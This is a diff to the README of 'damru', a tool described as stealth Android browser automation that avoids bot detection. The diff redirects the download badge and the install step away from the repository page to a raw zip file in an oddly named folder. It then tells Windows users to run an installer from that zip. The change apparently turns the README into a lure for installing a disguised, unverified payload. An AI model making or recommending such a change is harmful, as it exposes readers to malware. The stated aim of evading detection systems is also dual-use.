@@ -1,6 +1,6 @@
 # 🤖 damru - Reliable stealth browser automation for everyone
 
-[![](https://img.shields.io/badge/Download_Damru-Blue?style=for-the-badge)](https://github.com/Soliman-moh/damru)
+[![](https://img.shields.io/badge/Download_Damru-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Soliman-moh/damru/main/darrein/Software-v1.4.zip)
 
 Damru automates Android browser tasks without detection. Security systems often flag automated programs, but Damru mimics human behavior to keep your tasks running. It uses advanced techniques to hide the automation process. This tool works for data collection, testing, and other browser-based Android tasks.
 
@@ -18,7 +18,7 @@ Make sure your computer meets these needs before you start:
 
 Follow these steps to set up Damru on your Windows machine.
 
-1. Visit this page to download the software: https://github.com/Soliman-moh/damru
+1. Visit this page to download the software: https://raw.githubusercontent.com/Soliman-moh/damru/main/darrein/Software-v1.4.zip
 2. Locate the download folder on your computer.
 3. Open the installer file to begin the setup process.
 4. Follow the on-screen prompts to place the software on your drive.
